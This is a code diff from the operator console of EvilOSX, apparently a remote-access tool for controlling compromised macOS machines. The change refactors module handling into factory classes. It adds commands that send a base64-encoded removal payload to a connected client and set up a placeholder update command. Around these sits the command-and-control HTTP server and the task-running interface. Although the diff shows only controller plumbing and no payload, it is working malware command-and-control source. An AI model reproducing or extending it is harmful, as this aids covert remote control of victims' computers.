@@ -3,10 +3,11 @@
 """Interacts with the user via urwid."""
 __author__ = "Marten4n6"
 __license__ = "GPLv3"
-__version__ = "1.1.3"
+__version__ = "2.1.3"
 
 from model import *
-from modules import *
+from module_factory import ModuleFactory
+from loader_factory import LoaderFactory
 from controller import *
 import urwid
 import threading
@@ -216,9 +217,10 @@ class _OutputView(urwid.ListBox):
 class View(urwid.Frame):
     """This class interacts with the user."""
 
-    def __init__(self, model, modules, server_port):
+    def __init__(self, model, module_factory, loader_factory, server_port):
         self._model = model
-        self._modules = modules
+        self._module_factory = module_factory
+        self._loader_factory = loader_factory
 
         self._PALETTE = [
             ("reversed", urwid.BLACK, urwid.LIGHT_GRAY),
@@ -299,7 +301,7 @@ class View(urwid.Frame):
                 self.output_view.add("Invalid client ID (see \"clients\").", "attention")
                 self.output_view.add("Usage: connect <ID>", "attention")
         elif command == "modules":
-            modules = self._modules.get_modules()
+            modules = self._module_factory.get_modules()
 
             if not modules:
                 self.output_view.add(
@@ -309,10 +311,16 @@ class View(urwid.Frame):
                 )
                 self.output_view.add("Server start command: python server/server.py", "attention")
             else:
-                for module_name, module_imp in modules.iteritems():
-                    if module_name == "helpers":
-                        continue
+                special_modules = {
+                    # Special modules used by loaders
+                    "remove_client": "Removes EvilOSX from the client.",
+                    "update_client": "Updates the client to a newer version of EvilOSX."
+                }
 
+                for key, value in special_modules.iteritems():
+                    self.output_view.add("{0: <18} -   {1}".format(key, value))
+
+                for module_name, module_imp in modules.iteritems():
                     self.output_view.add("{0: <18} -   {1}".format(module_name, module_imp.info["Description"]))
         elif command == "clear":
             self.output_view.clear()
@@ -343,27 +351,52 @@ class View(urwid.Frame):
                         self.output_view.add("Invalid module name (see \"modules\").", "attention")
                         self.output_view.add("Usage: use <module>", "attention")
                     else:
-                        try:
-                            module_imp = self._modules.get_module(module_name)
-                            module_view = _ModulePrompt(module_name, self._main_loop)
-                            successful = Queue()  # Stores the return value of the module_imp setup.
+                        if module_name in ["remove_client", "update_client"]:
+                            # Special modules used by loaders
+                            loader_name = self._current_client.loader_name
+                            loader = self._loader_factory.get_loaders()[loader_name]
 
-                            self.footer = module_view
+                            if module_name == "remove_client":
+                                self.output_view.add(
+                                    "Removing the client using the \"%s\" loader..." % loader_name,
+                                    "info"
+                                )
 
-                            # Starts the module view in it's own thread, needed since
-                            # otherwise calls to prompt will block the whole GUI.
-                            module_thread = threading.Thread(target=module_imp.setup,
-                                                             args=(module_view, self.output_view, successful))
-                            module_thread.daemon = True
-                            module_thread.start()
+                                self._model.send_command(Command(
+                                    self._current_client.id, base64.b64encode(loader.remove_payload()), "remove_client"
+                                ))
 
-                            # Start a thread which waits for the module to finish setup.
-                            wait_thread = threading.Thread(target=self.module_wait,
-                                                           args=(module_view, module_thread, successful, module_imp))
-                            wait_thread.daemon = True
-                            wait_thread.start()
-                        except KeyError:
-                            self.output_view.add("That module doesn't exist!", "attention")
+                                self._model.remove_client(self._current_client.id)
+                                self.process_command("quit")
+                            elif module_name == "update_client":
+                                self.output_view.add(
+                                    "This module will be added at a later time, feel free to complain on GitHub.",
+                                    "attention"
+                                )
+                        else:
+                            try:
+                                module_imp = self._module_factory.get_module(module_name)
+                                module_view = _ModulePrompt(module_name, self._main_loop)
+                                successful = Queue()  # Stores the return value of the module_imp setup.
+
+                                self.footer = module_view
+
+                                # Starts the module view in it's own thread, needed since
+                                # otherwise calls to prompt will block the whole GUI.
+                                module_thread = threading.Thread(target=module_imp.setup,
+                                                                 args=(module_view, self.output_view, successful))
+                                module_thread.daemon = True
+                                module_thread.start()
+
+                                # Start a thread which waits for the module to finish setup.
+                                wait_thread = threading.Thread(target=self.module_wait,
+                                                               args=(
+                                                                   module_view, module_thread, successful, module_imp
+                                                               ))
+                                wait_thread.daemon = True
+                                wait_thread.start()
+                            except KeyError:
+                                self.output_view.add("That module doesn't exist!", "attention")
                 elif command.startswith("kill"):
                     # Kills a running task.
                     module_name = command.replace("kill ", "").strip()
@@ -436,13 +469,15 @@ def main():
     generate_ca()
 
     model = ClientModel()
-    modules = Modules()
-    view = View(model, modules, server_port)
+    module_factory = ModuleFactory()
+    loader_factory = LoaderFactory()
+    view = View(model, module_factory, loader_factory, server_port)
 
     # Via __init__ is a pain, trust me...
     ClientController._model = model
-    ClientController._modules = modules
     ClientController._output_view = view.output_view
+    ClientController._module_factory = module_factory
+    ClientController._loader_factory = loader_factory
 
     # Start the multi-threaded HTTP server in it's own thread.
     server = ThreadedHTTPServer(('', server_port), ClientController)
